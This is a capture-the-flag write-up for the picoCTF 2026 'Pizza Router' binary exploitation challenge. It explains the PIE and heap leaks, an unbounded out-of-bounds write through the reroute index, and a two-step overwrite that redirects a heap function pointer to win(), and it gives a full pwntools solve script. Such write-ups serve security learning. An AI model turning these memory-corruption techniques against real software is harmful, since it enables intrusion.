---
author: milrn
categories:
- picoCTF
- Binary Exploitation
- Hard
layout: post
media_subpath: /assets/posts/2026-03-24-pizza-router
tags:
- picoCTF 2026
- Heap
- Write Primitive
- Hard
title: Pizza Router
description: Pizza Router is a Hard Binary Exploitation challenge from picoCTF 2026. It has around 500 user solves as of writing this.
---

Pizza Router is a Hard Binary Exploitation challenge from picoCTF 2026. It has around 500 user solves as of writing this.

# Reversing

This challenge was an absolute pain to reverse due to the main() function being over 500 lines long in Ghidra. Normally for pwn challenges the C source is provided, but we have to work with what we've got. So as we go through the solve process, I'll paste and explain some code blocks; the reversing itself isn't that important since this is a Binary Exploitation writeup. The one thing I will mention right now is when opening the binary in Ghidra, I immediately spotted a win() function, and realized that the goal of exploitation was simply to call that function.

# Goal

After inspecting the code for a bit, the exploit path became clear. We somehow have to write over the address of fx_finish_dummy() stored on the heap with the address of win() because the code at that address gets called in the dispatch operation.

```
*(code **)(puVar14 + 0x10c) = fx_finish_dummy;
```

puVar14 is a 4 byte pointer which means each time the added value increments by 1 (0...0x10c), it will actually add 4 bytes to the puVar14 pointer instead due to how pointer arithmetic works in C. This means that this function pointer is stored 0x430 (0x10c*4) bytes after the start of the order's heap structure.

# Address Leaks

After manually exploring the program for a bit I came across two operations that give valuable information. The replay operation leaks a PIE address (specifically the fx_draw_basic function address) and the receipt operation leaks a heap address (specifically the start of the order's heap structure). Using the PIE address and known function offset, I was able to calculated the PIE base.

```
gef➤  run
Starting program: /home/kali/Documents/picoctf/pizza_router/router 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Pizza Drone Router (type 'help')
router> help
Commands:
  load <map>
  maps
  add_order <x> <y>
  coupon <id> <amt>
  reroute <id> <heap_idx> <new_cost>
  dispatch <id>
  replay <id>
  receipt <id>
  help
  quit
router> add_order 1 1
order #0 → (1,1)
router> replay 0
replay: 8 points; renderer=0x5587338bd260
(1,8) -> (1,7) -> (1,6) -> (1,5) -> (1,4) -> (1,3) -> (1,2) -> (1,1)
router> receipt 0
receipt: hops=8 coupon=0 total=8 hint=0x55874df24b90
router>
```

```
gef➤  x/100x 0x55874df24b90
0x55874df24b90: 0x00000080      0x00000003      0x4df24ba8      0x00005587
0x55874df24ba0: 0x4df24fb0      0x00005587      0x00000000      0x00000000
0x55874df24bb0: 0x00000022      0x00000007      0x000000a4      0x00000007
0x55874df24bc0: 0x000000b5      0x00000007      0x00000022      0x00000007
0x55874df24bd0: 0x00000011      0x00000007      0x000000b1      0x00000003
0x55874df24be0: 0x00000000      0x00000000      0x00000000      0x00000000
0x55874df24bf0: 0x00000000      0x00000000      0x00000000      0x00000000
0x55874df24c00: 0x00000000      0x00000000      0x00000000      0x00000000
0x55874df24c10: 0x00000000      0x00000000      0x00000000      0x00000000
0x55874df24c20: 0x00000000      0x00000000      0x00000000      0x00000000
```

By analyzing the addresses at the heap leak, we can clearly tell this is leaking the order's heap structure as defined in the code:

```
*puVar14 = 0x80;
*(undefined4 **)(puVar14 + 4) = puVar14 + 0x108;
*(code **)(puVar14 + 0x10c) = fx_finish_dummy;
*(code **)(puVar14 + 0x10e) = fx_draw_basic;
*(undefined4 **)(puVar14 + 2) = puVar28;
*(undefined8 *)(puVar14 + 0x108) = 0x6e6f656e;
*(undefined8 *)(puVar14 + 0x10a) = 0;
*(undefined4 **)(&DAT_001060a8 + lVar13 * 0x1038) = puVar14;
...
```

# Write Primitive

However, we can't do much with those addresses without a place to overwrite with them, and luckily, there is such a place! Inside the reroute operation, the heap_idx (user supplied input) is used to determine where the reroute entry x coordinate, y coordinate, and new_cost will be placed. However, this value is not bound checked, meaning we have an out of bounds write!

```
do {
    if ((piVar21[4] != 0) && ((int)lVar13 == *piVar21)) {
    lVar13 = (long)iVar6 * 0x1038;
    if (*(long *)(&DAT_001060a8 + lVar13) != 0) {
        uVar17 = strtol(pcVar15,(char **)0x0,10);
        uVar29 = uVar17 & 0xffffffff;
        lVar30 = strtol(__nptr,(char **)0x0,10);
        iVar27 = (int)lVar30;
        lVar30 = *(long *)(*(long *)(&DAT_001060a8 + lVar13) + 8);
        iVar25 = (int)uVar17;
        piVar21 = (int *)(lVar30 + (long)iVar25 * 8);
        iVar20 = *(int *)(&DAT_00105088 + lVar13) * G;
        iVar6 = *(int *)(&DAT_00105084 + lVar13);
        piVar21[1] = iVar27;
        *piVar21 = iVar20 + iVar6;
        lVar13 = (long)iVar25;
        if (1 < iVar25) goto LAB_00102015;
        goto LAB_00102028;
    }
```

This is illustrated in the decompiled code above, as you can see the iVar25 variable (which is the provided heap_idx) is being multiplied by 8 (the size of an entry containing information for a reroute) and being added to the start of the entries array in the order's larger heap structure (lVar30). We can control piVar21 because of our unbounded control over iVar25. A few lines down, there is an operation piVar21[1] = iVar27. Since integers are 4 bytes in C, indexing by one skips 4 bytes past the location we just chose and then writes iVar27 (new_cost) which is also user supplied input for the reroute operation. This is crucial, because of this 4 byte skip, we do not have a full arbitrary write primitive. The 4 bytes at index 0 are determined by iVar20 + iVar6, this is just a representation of the original route coordinates defined by add_order. Simplifying the logic, it is calculated using order->dst_y * G.width + order->dst_x. The grid width in this case is 16 (because of an implicit city1.map load). Discovering this, we can manipulate the first 4 bytes by simply changing the x and y values of the reroute.

# Bounds Checking

However, unlike the heap_idx, the coordinates are bounded when supplied through user input in the add_order operation.

```
if (((int)(uVar7 | uVar26) < 0) ||
    (((G <= (int)uVar26 || (DAT_00125784 <= (int)uVar7)) ||
    ((&DAT_00125788)[(long)(int)uVar26 + (long)(int)uVar7 * 0x20] == '#')))) {
puts("bad target");
}
```

This code ensures the selected coordinates are not at a wall or outside of the grid space. So, how can we bypass this?

# dst_x Overwrite Explanation

Remember those address leaks earlier? We're gonna put them to use. The order structure is located in the .bss memory section which uses the same PIE bytes for ASLR. Since we had a PIE leak and calculated the base, we can simply find the offset of the PIE base to the first element of the global orders array (ORD[0]). The first three fields of an order struct, stored in the orders array, are the order ID, the dst_x value, and the dst_y value.

```
(&ORD)[lVar13 * 0x40e] = iVar6;
*(uint *)(&DAT_00105084 + lVar30) = uVar26;
*(uint *)(&DAT_00105088 + lVar30) = uVar7;
```

This was derived from the above code snippet where lVar13 and iVar6 are the order ID number, which is set as the first field in the struct. uVar26 is the dst_x value and uVar7 is the dst_y value which are both taken from user input (add_order <dst_x> <dst_y>) after being bound checked. However, no further bound checks are performed on these values, so if we can overwrite at least dst_x with a much larger value, then we have a full arbitrary write primitive. If you don't remember, that is because the dst_x value directly controls the first 4 bytes of our 8 byte write with heap_idx (order->dst_y * G.width + order->dst_x).

Anyways, with our 8 byte semi-arbitrary write primitive, we can manipulate the heap_idx to write to the first element of the global orders array (ORD[0]) which we found by calculating it's fixed offset from the PIE base (20608).

```
┌──(kali㉿kali)-[~/Documents/picoctf/pizza_router]
└─$ python3            
Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> elf = ELF('./router')
[*] '/home/kali/Documents/picoctf/pizza_router/router'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
>>> print(elf.sym["ORD"])
20608
```

If we align heap_idx so that it starts the write exactly at the start of the ORD array, we will overwrite the (\*uint) dst_x field (last 4 bytes of the write) with the new_cost value that we fully control. But what do we set new_cost to? Well we want this expression: order->dst_y * G.width + order->dst_x to evaluate to the 4 least significant bytes of the win address. So, let's recall basic algebra and solve for the value of dst_x. Assuming we use *add_order 1 1* as our first order. The value of dst_y will be 1 (unchanged) and the value of G.width will be 16 which is the default width because the program loads the city1 map by default. The 32 lsb bits for the win() address will be calculated at runtime using the PIE base. It's important to note, when entering the new_cost value, it is read as a *signed* integer, which means it can be negative, and it will be converted to the appropriate *unsigned* integer on implicit cast into the dst_x field.

dst_x = s32(32_lsb_win - 16)

Now that we have the new_cost value to set, to overwrite dst_x with, all we need is the value of heap_idx that aligns with the start of the ORD array. We can use similar algebra like before to solve this.

```
lVar30 = *(long *)(*(long *)(&DAT_001060a8 + lVar13) + 8);
iVar25 = (int)uVar17;
piVar21 = (int *)(lVar30 + (long)iVar25 * 8);
```

As shown in this code snippet, we are accessing the value 8 bytes from the start of the order's heap structure (which holds the address of the start of the entries list in the heap structure), and dereferencing the value there; the value is 0x18. This was found by analyzing the heap structure in memory with GDB.

```
0x555977300b90: 0x00000080      0x00000003      0x77300ba8      0x00005559
0x555977300ba0: 0x77300fb0      0x00005559      0x00000000      0x00000000
0x555977300bb0: 0x00000022      0x00000007      0x000000a4      0x00000007
0x555977300bc0: 0x000000b5      0x00000007      0x00000022      0x00000007
0x555977300bd0: 0x00000011      0x00000007      0x000000b1      0x00000003
```

hex(0x555977300ba8 - 0x555977300b90) = 0x18

So, the following equation is obtained:

start_of_heap_entries_list + (heap_idx * 8) = ORD_addr

or in terms of what we have (heap_leak is the start of order's heap structure):

(heap_leak + 0x18) + (heap_idx * 8) = PIE_base + 20608

or:

heap_idx = s32(((PIE_base + 20608) - (heap_leak + 0x18)) // 8)

The integer division (//) is important here because we can't have a decimal index.

Ok that was a lot! Now most of the work is done.

# Implementing the Overwrite

So, we have the heap_idx to corrupt the write location, and the new_cost to corrupt the write value. One more thing we have to account for is the order ID field being changed. Since we only have a partial-write primitive, the first four bytes written (aka the ID field) will be determined by order->dst_y * G.width + order->dst_x. For the first write, this will be 1 * 16 + 1 or just 17, assuming the first order we add will be *add_order* 1 1. When trying to reference the order, we can't use ID 0 anymore, we will have to use ID 17 because when we overwrote dst_x, we also overwrote the order ID field to 17.

The chain for the dst_x overwrite to change the first 4 bytes of the next reroute operation on the same order is:

```
add_order 1 1
reroute 0 <calculated_heap_idx> <calculated_new_cost>
```

# Calling win()

After this chain executes, we can perform another reroute operation. This time the first 4 bytes written are the 4 least significant bytes of win() (due to our dst_x overwrite), and we control the last 4 bytes using new_cost directly and make them the 4 most significant bytes of win(). For this second reroute, the heap_idx should redirect the write to the offset of the fx_finish_dummy() function that we talked about at the very beginning, which has an offset of 0x430 from the heap leak. We can solve the exact same algebra as we solved for the last write with this new destination value.

(heap_leak + 0x18) + (heap_idx * 8) = (heap_leak + 0x430)

or:

heap_idx = s32(((heap_leak + 0x430) - (heap_leak + 0x18)) // 8)

So, the final chain would be something like this:

```
add_order 1 1
reroute 0 <calculated_heap_idx_1> <calculated_new_cost>
reroute 17 <calculated_heap_idx_2> <msb32_win()>
dispatch 17
```

# Solve Script

```
#!/usr/bin/env python3
import re
from pwn import *

context.log_level = "debug"
HOST = "" # enter remote host here
PORT = 0 # enter remote port here
PROMPT = b"router> "
elf = ELF("./router", checksec=False)

def cmd(io, line):
    io.sendline(line.encode())
    return io.recvuntil(PROMPT).decode("latin1", "replace")
# used to send a line of input and recieve the results of the operation

def leak(text, name):
    match = re.search(rf"{name}=(0x[0-9a-fA-F]+)", text)
    if not match:
        raise RuntimeError(f"missing {name} leak")
    return int(match.group(1), 16)
# used to get the heap and PIE leaks

def s32(x):
    x &= 0xFFFFFFFF
    return x - 0x100000000 if x & 0x80000000 else x
# used to convert an unsigned integer into a signed integer

def run_exploit():
    io = remote(HOST, PORT)
    try:
        io.recvuntil(PROMPT)
        cmd(io, "add_order 1 1") # add initial order with x and y as 1
        heap_struct_base = leak(cmd(io, "receipt 0"), "hint") # leak heap address
        fx_draw_basic = leak(cmd(io, "replay 0"), "renderer") # leak PIE address
        pie_base = fx_draw_basic - elf.sym["fx_draw_basic"] # calculate PIE base from PIE leak
        ord0 = pie_base + elf.sym["ORD"] # calculate start of the ORD array using the leaked PIE base
        win = pie_base + elf.sym["win"] # calculate the address of the win() function using the leaked PIE base
        lsb32_win = win & 0xFFFFFFFF # get the 32 LSB (4 least significant bytes)
        calculated_heap_idx_1 = s32((ord0 - (heap_struct_base + 0x18)) // 8) # calculate the value of heap_idx that results in the arbitrary write being moved to the beginning of the ORD array
        cmd(io, f"reroute 0 {calculated_heap_idx_1} {s32(lsb32_win - 16)}") # writes the new_cost value that makes dst_x in ORD[0] the exact value that results in order->dst_y * G.width + order->dst_x evaluating to the 32 LSB of win()
        calculated_heap_idx_2 = s32(((heap_struct_base + 0x430) - (heap_struct_base + 0x18)) // 8) # calculate the value of heap_idx that results in the arbitrary write being moved to the fx_draw_basic() function pointer stored on the heap
        cmd(io, f"reroute 17 {calculated_heap_idx_2} {win >> 32}") # references index 17 instead of index 0 because of the overwritten index value and passes in win >> 32 as the new_cost value (msb32_win) as this will be the 4 most significant bytes of the win() address
        dispatch = cmd(io, "dispatch 17") # dispatch operation excutes the code, specifically at the address we just overwrote to win(), which therefore prints the flag
        flag = re.search(r"flag\{[^}]+\}", dispatch) # get the flag
        if not flag:
            return None
        return {
            "flag": flag.group(0),
            "heap_struct_base": heap_struct_base,
            "pie_base": pie_base,
            "ord0": ord0,
            "win": win
        }
    finally:
        io.close()

def main():
	try:
	    result = run_exploit()
	except Exception:
	    result = None
	if result:
	    print(result)
	    return

if __name__ == "__main__":
    main()
```

# Final Thoughts

This challenge was pretty interesting, but I was a little annoyed that it was so reversing heavy. The actual exploitation portion of this problem took me substantially less time then the reversing did. I hope for the next year's picoCTF the Binary Exploitation questions all have the source code attached, but the actual exploitation portion of the problems are significantly harder.
